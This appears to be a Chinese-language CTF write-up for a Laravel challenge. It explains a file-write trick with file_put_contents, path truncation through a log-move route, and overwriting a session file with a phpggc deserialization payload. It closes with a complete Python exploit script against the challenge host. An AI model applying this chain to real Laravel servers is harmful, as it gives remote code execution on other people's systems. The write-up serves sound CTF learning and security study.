# bestlanguage

## 非预期
laravel 低版本CVE-2018-15133，直接反序列化RCE了，出题人心态炸裂

## 预期

此题来源于真实业务改编


## 写文件
Docker/app/app/Http/Controllers/IndexController.php
第一步的考点是写文件，估计大部分人访问upload接口都是500
因为file_put_contents是不能跨目录新建文件的
```php
public function upload()
{

    if(strpos($_POST["filename"], '../') !== false) die("???");
    file_put_contents("/var/tmp/".md5($_SERVER["REMOTE_ADDR"])."/".$_POST["filename"],base64_decode($_POST["content"]));
    echo "/var/tmp/".md5($_SERVER["REMOTE_ADDR"])."/".$_POST["filename"];
}
```
由于init目录只能内网访问，md5($_SERVER["REMOTE_ADDR"])这个目录是不存在的，所以file_put_contents无法写成功
返回会一直500，这个本地搭建开debug就能发现

第一个考点就是如何让文件落地，file_put_contents有个trick，如果写入的文件名是xxxxx/.
那么/.会被忽略，会直接写入xxxxx文件

所以我们传入filename=.
即可在/var/tmp下生成md5($_SERVER["REMOTE_ADDR"])文件
### move
文件落地以后就可以通过move/log路由对文件进行移动了
```php
public function moveLog($filename)
{

    $data =date("Y-m-d");
    if(!file_exists(storage_path("logs")."/".$data)){
        mkdir(storage_path("logs")."/".$data);
    }
    $opts = array(
        'http'=>array(
            'method'=>"GET",
            'timeout'=>1,//单位秒
        )
    );

    $content = file_get_contents("http://127.0.0.1/tmp/".md5('127.0.0.1')."/".$filename,false,stream_context_create($opts));
    file_put_contents(storage_path("logs")."/".$data."/".$filename,$content);
    echo storage_path("logs")."/".$data."/".$filename;
}
```
首先讲一个坑
```php
Route::get('/tmp/{filename}', function ($filename) {
    readfile("/var/tmp/".$filename);
})->where('filename', '(.*)');
```
这个路由是读不到flag的，因为nginx会对路径进行判断，如果输入的../超过了根目录，那么会直接返回400

| 请求路径                       | 状态码格    | 
| --------                      | -----   | 
| GET /../ HTTP/1.1             | 400      |  
| GET /123123/../                | 200      |  
| GET /%2e%2e%2f                  | 400      | 
| GET /123123/3123123/../          | 200      | 
| GET /123123/3123123/../../       | 200      | 
| GET /123123/3123123/../../../     | 400      | 

这个是nginx的判断，所以无法../跳到根目录

好，那movelog函数能做什么
他会去请求 `http://127.0.0.1/tmp/".md5('127.0.0.1')."/".$filename`
然后把返回结果写入
```php
$data =date("Y-m-d");
file_put_contents(storage_path("logs")."/".$data."/".$filename,$content);
```


我们可以输入 ?filename=../${md5(ip)} 访问到我们的文件
然后会写入到log目录下
由于上面我们虽然让文件落地了，但是文件名是md5 ip，不可控，但是我们可以通过url和路径的差异，用？或者#截断
所以输入 ../${md5(ip)}?/../../abcd
即可将我们落地的文件移动到任意目录下的任意文件名

当然这里还是受nginx影响，我们只能在storage里面任意写入文件

然而laravel的session也存在在storage目录里，我们直接覆盖session文件进行反序列化
本题用的laravel 5.5.39，phpggc里就有现成的反序列化链

laravel的session文件名不是常规的SESS_sessid，所以我放出了APP_KEY，本地搭建即可看到session文件名，
与远程是一样的

exp.py可以直接打获取flag(没有一个人用预期做的，心态崩了，随便写写wp
```php
import requests
import os
import base64
import urllib.request
import re

remote_ip = "39.104.19.182:8080"
md5_ip = "e4cfc06ac6f1336028e43916cf1d75d3"
phpggc_data = base64.b64encode(os.popen('php D:\脚本\phpggc\phpggc Laravel/RCE4 system "cat /flag"').read().encode("utf8"))



paramsPost = {"filename": "tmp/" + md5_ip}
headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
           "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
           "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0",
           "Connection": "close", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
           "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded"}
cookies = {"sessionid": "8k648uvlg2brp93id13fq0vvy6jaticd1",
           "csrftoken": "anYz8P4YYYwqB7yhFfPztk5rfp97qaBzzwtUeCswsfWroUzNgiD58QzbKE6OT2Dv",
           "laravel_session": "eyJpdiI6ImVmbllpOGtVeXQxQjZ4cXFEM3k0eXc9PSIsInZhbHVlIjoidVNvTWNocGp4cEdPdG5rWXVEVFdIb0UzRG5KcThxTk5uU3lKdjFXbzRMdXlHUkVrcFNtV0ZRa1JUYUhSUXJrSlduZHU1MDJWZUZVaG1qODFxRjJoakE9PSIsIm1hYyI6ImYyZTQ3ZmZkNDRlYjQ5MGY2OGUzMzM1NjlkYTZjOTc1MGUzZGQyMWIwYTBkYzgyNmUyNjA5NTJjNWU0NGE1YzMifQ%3D%3D"}
response = requests.post("http://" + remote_ip + "/rm", data=paramsPost, headers=headers, cookies=cookies)

print("clear file")
print("Response body: %s" % response.content)


paramsPost = {"content":phpggc_data,"filename":"."}
headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Cache-Control":"max-age=0","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0","Connection":"close","Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2","Accept-Encoding":"gzip, deflate","Content-Type":"application/x-www-form-urlencoded"}
cookies = {"sessionid":"8k648uvlg2brp93id13fq0vvy6jaticd1","csrftoken":"anYz8P4YYYwqB7yhFfPztk5rfp97qaBzzwtUeCswsfWroUzNgiD58QzbKE6OT2Dv","laravel_session":"eyJpdiI6ImVmbllpOGtVeXQxQjZ4cXFEM3k0eXc9PSIsInZhbHVlIjoidVNvTWNocGp4cEdPdG5rWXVEVFdIb0UzRG5KcThxTk5uU3lKdjFXbzRMdXlHUkVrcFNtV0ZRa1JUYUhSUXJrSlduZHU1MDJWZUZVaG1qODFxRjJoakE9PSIsIm1hYyI6ImYyZTQ3ZmZkNDRlYjQ5MGY2OGUzMzM1NjlkYTZjOTc1MGUzZGQyMWIwYTBkYzgyNmUyNjA5NTJjNWU0NGE1YzMifQ%3D%3D"}
response = requests.post("http://"+remote_ip+"/upload", data=paramsPost, headers=headers, cookies=cookies)

print("upload file")
print("Response body: %s" % response.content)

response = urllib.request.urlopen("http://"+remote_ip+"/move/log/../"+md5_ip+"%3f/../../framework/sessions/BDDLh0HsqaXe54sPFUuzMT7azrLUC9JGtw1SNdZV")
print("move file")
print("Response body: %s" % response.read().decode('utf-8'))

headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Cache-Control":"max-age=0","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0","Connection":"close","Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2","Accept-Encoding":"gzip, deflate"}
cookies = {"sessionid":"8k648uvlg2brp93id13fq0vvy6jaticd1","csrftoken":"anYz8P4YYYwqB7yhFfPztk5rfp97qaBzzwtUeCswsfWroUzNgiD58QzbKE6OT2Dv","laravel_session":"eyJpdiI6ImVmbllpOGtVeXQxQjZ4cXFEM3k0eXc9PSIsInZhbHVlIjoidVNvTWNocGp4cEdPdG5rWXVEVFdIb0UzRG5KcThxTk5uU3lKdjFXbzRMdXlHUkVrcFNtV0ZRa1JUYUhSUXJrSlduZHU1MDJWZUZVaG1qODFxRjJoakE9PSIsIm1hYyI6ImYyZTQ3ZmZkNDRlYjQ5MGY2OGUzMzM1NjlkYTZjOTc1MGUzZGQyMWIwYTBkYzgyNmUyNjA5NTJjNWU0NGE1YzMifQ%3D%3D"}
response = requests.get("http://"+remote_ip+"/tmp/123", headers=headers, cookies=cookies)

print("exploit success!")
res = response.content.decode("utf-8")
print(re.search(r"(.*)<!DOCTYPE html>",res,re.S).group(1))
```
